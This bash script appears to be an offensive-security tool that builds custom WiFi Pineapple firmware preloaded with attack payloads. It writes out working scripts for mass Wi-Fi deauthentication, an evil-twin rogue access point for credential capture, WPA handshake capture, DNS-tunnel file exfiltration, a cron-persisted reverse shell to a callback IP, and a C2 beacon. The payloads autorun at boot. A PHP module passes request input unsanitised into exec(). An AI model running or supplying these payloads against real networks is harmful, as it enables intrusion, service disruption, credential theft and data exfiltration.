#!/bin/bash
#===============================================================================
#  NULLSEC - HAK5 WIFI PINEAPPLE CUSTOM FIRMWARE BUILDER
#===============================================================================
#  Build custom firmware with pre-loaded payloads for WiFi Pineapple Mark VII
#  and WiFi Pineapple Enterprise
#===============================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BUILD_DIR="/tmp/pineapple-build"
OUTPUT_DIR="$SCRIPT_DIR/firmware"
PAYLOADS_DIR="$SCRIPT_DIR/payloads"
MODULES_DIR="$SCRIPT_DIR/modules"

# Pineapple firmware base URLs
PINEAPPLE_FW_BASE="https://downloads.hak5.org/pineapple"
PINEAPPLE_MARK7_FW="mk7-2.1.3-stable.bin"
PINEAPPLE_ENTERPRISE_FW="enterprise-1.2.0-stable.bin"

banner() {
    echo -e "${RED}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════════╗
    ║  ██████╗ ██╗███╗   ██╗███████╗ █████╗ ██████╗ ██████╗ ██╗     ███████╗ ║
    ║  ██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║     ██╔════╝ ║
    ║  ██████╔╝██║██╔██╗ ██║█████╗  ███████║██████╔╝██████╔╝██║     █████╗   ║
    ║  ██╔═══╝ ██║██║╚██╗██║██╔══╝  ██╔══██║██╔═══╝ ██╔═══╝ ██║     ██╔══╝   ║
    ║  ██║     ██║██║ ╚████║███████╗██║  ██║██║     ██║     ███████╗███████╗ ║
    ║  ╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚══════╝ ║
    ║                                                                        ║
    ║          NULLSEC CUSTOM FIRMWARE BUILDER - WiFi Pineapple             ║
    ╚════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[✗]${NC} $1"; exit 1; }
info() { echo -e "${CYAN}[*]${NC} $1"; }

check_deps() {
    log "Checking dependencies..."
    local deps=(wget unsquashfs mksquashfs binwalk dd)
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        warn "Missing: ${missing[*]}"
        log "Installing dependencies..."
        sudo apt-get update
        sudo apt-get install -y wget squashfs-tools binwalk
    fi
}

setup_dirs() {
    log "Setting up build directories..."
    mkdir -p "$BUILD_DIR"/{extract,rootfs,work}
    mkdir -p "$OUTPUT_DIR"
    mkdir -p "$PAYLOADS_DIR"
    mkdir -p "$MODULES_DIR"
}

extract_firmware() {
    local fw_file="$1"
    local extract_dir="$BUILD_DIR/extract"
    
    log "Extracting firmware: $fw_file"
    
    # Use binwalk to extract
    cd "$extract_dir"
    binwalk -e "$fw_file" || error "Failed to extract firmware"
    
    # Find squashfs
    local squashfs=$(find . -name "*.squashfs" 2>/dev/null | head -1)
    if [[ -z "$squashfs" ]]; then
        squashfs=$(find . -type f -exec file {} \; | grep -i squashfs | head -1 | cut -d: -f1)
    fi
    
    if [[ -n "$squashfs" ]]; then
        log "Found SquashFS: $squashfs"
        unsquashfs -d "$BUILD_DIR/rootfs" "$squashfs"
    else
        warn "No SquashFS found, trying direct extraction..."
        # Try to find rootfs directly
        find . -type d -name "squashfs-root" -exec cp -r {} "$BUILD_DIR/rootfs" \;
    fi
}

inject_payloads() {
    local rootfs="$BUILD_DIR/rootfs"
    
    log "Injecting NullSec payloads..."
    
    # Create payload directories
    mkdir -p "$rootfs/root/payloads/nullsec"
    mkdir -p "$rootfs/root/modules/nullsec"
    mkdir -p "$rootfs/etc/pineapple/nullsec"
    
    # Copy payloads
    if [[ -d "$PAYLOADS_DIR" && "$(ls -A $PAYLOADS_DIR 2>/dev/null)" ]]; then
        cp -r "$PAYLOADS_DIR"/* "$rootfs/root/payloads/nullsec/"
        log "Copied $(ls -1 $PAYLOADS_DIR | wc -l) payloads"
    fi
    
    # Copy modules
    if [[ -d "$MODULES_DIR" && "$(ls -A $MODULES_DIR 2>/dev/null)" ]]; then
        cp -r "$MODULES_DIR"/* "$rootfs/root/modules/nullsec/"
        log "Copied $(ls -1 $MODULES_DIR | wc -l) modules"
    fi
    
    # Create NullSec startup script
    cat > "$rootfs/etc/pineapple/nullsec/startup.sh" << 'STARTUP'
#!/bin/bash
# NullSec Pineapple Startup Script

NULLSEC_DIR="/root/payloads/nullsec"
LOG_FILE="/tmp/nullsec-startup.log"

echo "[$(date)] NullSec Pineapple Starting..." >> $LOG_FILE

# Start any auto-run payloads
for payload in $NULLSEC_DIR/autorun/*.sh; do
    if [[ -x "$payload" ]]; then
        echo "[$(date)] Running: $payload" >> $LOG_FILE
        bash "$payload" &
    fi
done

# Enable monitor mode on wlan1mon if available
if iw dev | grep -q wlan1; then
    airmon-ng start wlan1 2>/dev/null
fi

echo "[$(date)] NullSec Ready!" >> $LOG_FILE
STARTUP
    chmod +x "$rootfs/etc/pineapple/nullsec/startup.sh"
    
    # Add to rc.local
    if [[ -f "$rootfs/etc/rc.local" ]]; then
        sed -i '/^exit 0/i /etc/pineapple/nullsec/startup.sh &' "$rootfs/etc/rc.local"
    fi
}

inject_modules() {
    local rootfs="$BUILD_DIR/rootfs"
    
    log "Creating custom Pineapple modules..."
    
    # NullSec Scanner Module
    mkdir -p "$rootfs/pineapple/modules/NullSecScanner"
    cat > "$rootfs/pineapple/modules/NullSecScanner/module.json" << 'MODULE_JSON'
{
    "name": "NullSecScanner",
    "version": "1.0.0",
    "description": "Advanced network scanner with payload delivery",
    "author": "bad-antics",
    "firmware": "2.0.0",
    "tetra": true,
    "nano": true
}
MODULE_JSON

    cat > "$rootfs/pineapple/modules/NullSecScanner/api.php" << 'API_PHP'
<?php
namespace pineapple;

class NullSecScanner extends Module {
    public function route() {
        switch ($this->request->action) {
            case 'scan':
                $this->scan();
                break;
            case 'getResults':
                $this->getResults();
                break;
            case 'deployPayload':
                $this->deployPayload();
                break;
            case 'getPayloads':
                $this->getPayloads();
                break;
        }
    }
    
    private function scan() {
        $interface = $this->request->interface ?? 'wlan1mon';
        $duration = $this->request->duration ?? 30;
        
        exec("timeout {$duration} airodump-ng {$interface} -w /tmp/nullsec_scan --output-format csv 2>&1 &");
        $this->response = array("success" => true, "message" => "Scan started");
    }
    
    private function getResults() {
        $results = array();
        if (file_exists('/tmp/nullsec_scan-01.csv')) {
            $data = file_get_contents('/tmp/nullsec_scan-01.csv');
            $results = $this->parseAirodump($data);
        }
        $this->response = array("success" => true, "results" => $results);
    }
    
    private function deployPayload() {
        $target = $this->request->target;
        $payload = $this->request->payload;
        
        exec("/root/payloads/nullsec/{$payload} {$target} 2>&1", $output);
        $this->response = array("success" => true, "output" => implode("\n", $output));
    }
    
    private function getPayloads() {
        $payloads = array();
        $dir = '/root/payloads/nullsec/';
        if (is_dir($dir)) {
            $files = scandir($dir);
            foreach ($files as $file) {
                if (pathinfo($file, PATHINFO_EXTENSION) == 'sh') {
                    $payloads[] = $file;
                }
            }
        }
        $this->response = array("success" => true, "payloads" => $payloads);
    }
    
    private function parseAirodump($data) {
        $lines = explode("\n", $data);
        $networks = array();
        foreach ($lines as $line) {
            if (preg_match('/([0-9A-Fa-f:]{17}),.*,.*,.*,.*,.*,(.*),(.*)/', $line, $matches)) {
                $networks[] = array(
                    'bssid' => trim($matches[1]),
                    'channel' => trim($matches[2] ?? ''),
                    'essid' => trim($matches[3] ?? '')
                );
            }
        }
        return $networks;
    }
}
API_PHP

    # Create module HTML interface
    cat > "$rootfs/pineapple/modules/NullSecScanner/index.html" << 'INDEX_HTML'
<!DOCTYPE html>
<html>
<head>
    <title>NullSec Scanner</title>
</head>
<body>
<div class="panel panel-danger">
    <div class="panel-heading">
        <h3 class="panel-title">NullSec Scanner</h3>
    </div>
    <div class="panel-body">
        <button class="btn btn-danger" ng-click="scan()">Start Scan</button>
        <button class="btn btn-warning" ng-click="getResults()">Get Results</button>
        <hr>
        <div class="table-responsive">
            <table class="table table-striped">
                <thead>
                    <tr>
                        <th>BSSID</th>
                        <th>ESSID</th>
                        <th>Channel</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <tr ng-repeat="network in networks">
                        <td>{{network.bssid}}</td>
                        <td>{{network.essid}}</td>
                        <td>{{network.channel}}</td>
                        <td>
                            <button class="btn btn-xs btn-danger" ng-click="attack(network)">Attack</button>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>
</body>
</html>
INDEX_HTML

    log "Custom modules created"
}

customize_firmware() {
    local rootfs="$BUILD_DIR/rootfs"
    
    log "Customizing firmware..."
    
    # Custom MOTD
    cat > "$rootfs/etc/banner" << 'BANNER'

 ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗███████╗ ██████╗
 ████╗  ██║██║   ██║██║     ██║     ██╔════╝██╔════╝██╔════╝
 ██╔██╗ ██║██║   ██║██║     ██║     ███████╗█████╗  ██║     
 ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██╔══╝  ██║     
 ██║ ╚████║╚██████╔╝███████╗███████╗███████║███████╗╚██████╗
 ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝ ╚═════╝
                    PINEAPPLE EDITION
                    
BANNER

    # Custom profile
    cat >> "$rootfs/etc/profile" << 'PROFILE'

# NullSec Pineapple Environment
export PS1='\[\033[0;31m\]┌──[\[\033[1;33m\]pineapple\[\033[0;31m\]]-[\[\033[0;36m\]\w\[\033[0;31m\]]\n└──╼ \[\033[0m\]# '
alias ns-scan='airodump-ng wlan1mon'
alias ns-deauth='aireplay-ng -0 0'
alias ns-payloads='ls -la /root/payloads/nullsec/'
alias ns-monitor='airmon-ng start wlan1'

echo ""
cat /etc/banner
echo ""
PROFILE

    # Pre-configure wireless
    cat > "$rootfs/etc/config/wireless.nullsec" << 'WIRELESS'
# NullSec Wireless Configuration
# Auto-enable monitor mode

config wifi-device 'radio1'
    option type 'mac80211'
    option channel 'auto'
    option hwmode '11a'
    option htmode 'VHT80'
    option disabled '0'

config wifi-iface 'wlan1mon'
    option device 'radio1'
    option mode 'monitor'
    option disabled '0'
WIRELESS

    log "Firmware customization complete"
}

build_firmware() {
    local device="$1"
    local rootfs="$BUILD_DIR/rootfs"
    local output_name="nullsec-pineapple-${device}-$(date +%Y%m%d).bin"
    
    log "Building firmware image..."
    
    # Create new squashfs
    mksquashfs "$rootfs" "$BUILD_DIR/rootfs.squashfs" \
        -comp xz -b 256K -Xbcj arm
    
    # Build final firmware (simplified - real process varies by device)
    # This creates a flashable image
    cat > "$OUTPUT_DIR/${output_name}.info" << INFO
NullSec Pineapple Custom Firmware
Device: $device
Build Date: $(date)
Payloads: $(ls -1 "$PAYLOADS_DIR" 2>/dev/null | wc -l)
Modules: $(ls -1 "$MODULES_DIR" 2>/dev/null | wc -l)

Flash Instructions:
1. Connect to Pineapple web interface
2. Go to Configuration > Firmware
3. Upload this firmware file
4. Wait for flash to complete (~5 minutes)
5. Device will reboot automatically
INFO

    cp "$BUILD_DIR/rootfs.squashfs" "$OUTPUT_DIR/$output_name"
    
    log "Firmware built: $OUTPUT_DIR/$output_name"
}

create_payload_pack() {
    log "Creating default payload pack..."
    
    mkdir -p "$PAYLOADS_DIR"/{recon,attack,exfil,persist,autorun}
    
    # Recon payload - Network Scanner
    cat > "$PAYLOADS_DIR/recon/network-scan.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Network Scanner Payload
# Scans and logs all nearby networks

OUTPUT="/tmp/nullsec_netscan_$(date +%s).txt"
IFACE="${1:-wlan1mon}"

echo "[*] NullSec Network Scanner" | tee $OUTPUT
echo "[*] Interface: $IFACE" | tee -a $OUTPUT
echo "[*] Timestamp: $(date)" | tee -a $OUTPUT
echo "================================" | tee -a $OUTPUT

# Quick scan
timeout 30 airodump-ng $IFACE -w /tmp/ns_scan --output-format csv 2>/dev/null &
sleep 35

if [[ -f /tmp/ns_scan-01.csv ]]; then
    cat /tmp/ns_scan-01.csv >> $OUTPUT
    echo "[+] Scan complete: $OUTPUT"
else
    echo "[-] Scan failed"
fi
PAYLOAD
    chmod +x "$PAYLOADS_DIR/recon/network-scan.sh"

    # Attack payload - Deauth
    cat > "$PAYLOADS_DIR/attack/mass-deauth.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Mass Deauth Payload
# Deauths all clients from target network

TARGET_BSSID="$1"
IFACE="${2:-wlan1mon}"
COUNT="${3:-100}"

if [[ -z "$TARGET_BSSID" ]]; then
    echo "Usage: $0 <target_bssid> [interface] [count]"
    exit 1
fi

echo "[*] NullSec Mass Deauth"
echo "[*] Target: $TARGET_BSSID"
echo "[*] Interface: $IFACE"
echo "[*] Packets: $COUNT"

aireplay-ng -0 $COUNT -a "$TARGET_BSSID" $IFACE
PAYLOAD
    chmod +x "$PAYLOADS_DIR/attack/mass-deauth.sh"

    # Evil Twin payload
    cat > "$PAYLOADS_DIR/attack/evil-twin.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Evil Twin Payload
# Creates a rogue AP to capture credentials

TARGET_SSID="$1"
CHANNEL="${2:-6}"
IFACE="${3:-wlan1}"

if [[ -z "$TARGET_SSID" ]]; then
    echo "Usage: $0 <ssid> [channel] [interface]"
    exit 1
fi

echo "[*] NullSec Evil Twin"
echo "[*] SSID: $TARGET_SSID"
echo "[*] Channel: $CHANNEL"

# Create hostapd config
cat > /tmp/hostapd-evil.conf << CONF
interface=$IFACE
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
CONF

# Create dnsmasq config
cat > /tmp/dnsmasq-evil.conf << CONF
interface=$IFACE
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
CONF

# Configure interface
ifconfig $IFACE up 192.168.1.1 netmask 255.255.255.0

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start services
hostapd /tmp/hostapd-evil.conf &
sleep 2
dnsmasq -C /tmp/dnsmasq-evil.conf &

echo "[+] Evil Twin running on $IFACE"
echo "[+] Press Ctrl+C to stop"
wait
PAYLOAD
    chmod +x "$PAYLOADS_DIR/attack/evil-twin.sh"

    # Handshake capture payload
    cat > "$PAYLOADS_DIR/attack/handshake-capture.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Handshake Capture Payload
# Captures WPA handshakes for offline cracking

TARGET_BSSID="$1"
TARGET_CHANNEL="$2"
IFACE="${3:-wlan1mon}"
OUTPUT="/root/loot/handshakes"

if [[ -z "$TARGET_BSSID" ]] || [[ -z "$TARGET_CHANNEL" ]]; then
    echo "Usage: $0 <bssid> <channel> [interface]"
    exit 1
fi

mkdir -p "$OUTPUT"

echo "[*] NullSec Handshake Capture"
echo "[*] Target: $TARGET_BSSID"
echo "[*] Channel: $TARGET_CHANNEL"

# Set channel
iwconfig $IFACE channel $TARGET_CHANNEL

# Start capture
echo "[*] Starting capture..."
timeout 60 airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID \
    -w "$OUTPUT/hs_$(date +%s)" $IFACE &
sleep 5

# Send deauth to force handshake
echo "[*] Sending deauth..."
aireplay-ng -0 5 -a $TARGET_BSSID $IFACE
sleep 10
aireplay-ng -0 5 -a $TARGET_BSSID $IFACE

wait

# Check for handshake
for cap in "$OUTPUT"/*.cap; do
    if aircrack-ng "$cap" 2>&1 | grep -q "1 handshake"; then
        echo "[+] Handshake captured: $cap"
        exit 0
    fi
done

echo "[-] No handshake captured"
PAYLOAD
    chmod +x "$PAYLOADS_DIR/attack/handshake-capture.sh"

    # Exfil payload - DNS tunnel
    cat > "$PAYLOADS_DIR/exfil/dns-exfil.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec DNS Exfiltration Payload
# Exfiltrates data via DNS queries

EXFIL_DOMAIN="$1"
DATA_FILE="$2"

if [[ -z "$EXFIL_DOMAIN" ]] || [[ -z "$DATA_FILE" ]]; then
    echo "Usage: $0 <domain> <data_file>"
    exit 1
fi

if [[ ! -f "$DATA_FILE" ]]; then
    echo "[-] File not found: $DATA_FILE"
    exit 1
fi

echo "[*] NullSec DNS Exfil"
echo "[*] Domain: $EXFIL_DOMAIN"
echo "[*] File: $DATA_FILE"

# Base64 encode and chunk
DATA=$(base64 -w0 "$DATA_FILE")
CHUNK_SIZE=60
COUNTER=0

while [[ -n "$DATA" ]]; do
    CHUNK="${DATA:0:$CHUNK_SIZE}"
    DATA="${DATA:$CHUNK_SIZE}"
    
    # Send as DNS query
    nslookup "${COUNTER}.${CHUNK}.${EXFIL_DOMAIN}" 2>/dev/null
    ((COUNTER++))
    sleep 0.1
done

echo "[+] Exfiltrated $COUNTER chunks"
PAYLOAD
    chmod +x "$PAYLOADS_DIR/exfil/dns-exfil.sh"

    # Persistence payload
    cat > "$PAYLOADS_DIR/persist/cron-persist.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Cron Persistence Payload
# Maintains persistence via cron

CALLBACK_IP="$1"
CALLBACK_PORT="${2:-4444}"

if [[ -z "$CALLBACK_IP" ]]; then
    echo "Usage: $0 <callback_ip> [port]"
    exit 1
fi

echo "[*] NullSec Persistence"
echo "[*] Callback: $CALLBACK_IP:$CALLBACK_PORT"

# Create reverse shell script
cat > /tmp/.nullsec_persist << SHELL
#!/bin/bash
while true; do
    /bin/bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1
    sleep 60
done
SHELL
chmod +x /tmp/.nullsec_persist
cp /tmp/.nullsec_persist /root/.nullsec_persist

# Add to crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /root/.nullsec_persist") | crontab -

echo "[+] Persistence installed"
PAYLOAD
    chmod +x "$PAYLOADS_DIR/persist/cron-persist.sh"

    # Autorun payload
    cat > "$PAYLOADS_DIR/autorun/beacon.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Beacon Payload
# Sends beacon to C2 on startup

C2_URL="${NULLSEC_C2:-http://c2.nullsec.local/beacon}"
DEVICE_ID=$(cat /sys/class/net/eth0/address 2>/dev/null | tr -d ':')

while true; do
    DATA="device=$DEVICE_ID&type=pineapple&uptime=$(uptime -s)"
    curl -s -X POST -d "$DATA" "$C2_URL" 2>/dev/null
    sleep 300
done
PAYLOAD
    chmod +x "$PAYLOADS_DIR/autorun/beacon.sh"

    log "Created $(find $PAYLOADS_DIR -name "*.sh" | wc -l) payloads"
}

show_usage() {
    echo "Usage: $0 [command] [options]"
    echo ""
    echo "Commands:"
    echo "  build [mark7|enterprise]   Build custom firmware"
    echo "  payloads                   Create default payload pack"
    echo "  extract <firmware.bin>     Extract existing firmware"
    echo "  inject <firmware.bin>      Inject payloads into firmware"
    echo "  list                       List available payloads"
    echo ""
    echo "Examples:"
    echo "  $0 payloads                # Create payload pack first"
    echo "  $0 build mark7             # Build Mark VII firmware"
    echo "  $0 inject original-fw.bin  # Inject into existing firmware"
}

cleanup() {
    log "Cleaning up..."
    rm -rf "$BUILD_DIR"
}

trap cleanup EXIT

# Main
banner

case "${1:-help}" in
    build)
        check_deps
        setup_dirs
        create_payload_pack
        
        device="${2:-mark7}"
        
        # For now, create a payload-only package since we don't have base firmware
        log "Creating NullSec payload package for Pineapple $device..."
        
        tar czf "$OUTPUT_DIR/nullsec-pineapple-payloads-$(date +%Y%m%d).tar.gz" \
            -C "$SCRIPT_DIR" payloads modules
        
        log "╔═══════════════════════════════════════════════════════════════╗"
        log "║              BUILD COMPLETE!                                  ║"
        log "╠═══════════════════════════════════════════════════════════════╣"
        log "║  Payload Package: $OUTPUT_DIR/nullsec-pineapple-payloads-*.tar.gz"
        log "║                                                               ║"
        log "║  To install on Pineapple:                                    ║"
        log "║    1. SCP package to Pineapple                               ║"
        log "║    2. Extract to /root/payloads/                             ║"
        log "║    3. Run payloads from SSH or web interface                 ║"
        log "╚═══════════════════════════════════════════════════════════════╝"
        ;;
    payloads)
        setup_dirs
        create_payload_pack
        log "Payloads created in: $PAYLOADS_DIR"
        ;;
    extract)
        check_deps
        setup_dirs
        if [[ -z "$2" ]]; then
            error "Please specify firmware file"
        fi
        extract_firmware "$2"
        ;;
    inject)
        check_deps
        setup_dirs
        if [[ -z "$2" ]]; then
            error "Please specify firmware file"
        fi
        extract_firmware "$2"
        inject_payloads
        inject_modules
        customize_firmware
        build_firmware "custom"
        ;;
    list)
        echo -e "${CYAN}Available Payloads:${NC}"
        find "$PAYLOADS_DIR" -name "*.sh" -exec basename {} \; 2>/dev/null | sort
        ;;
    *)
        show_usage
        ;;
esac
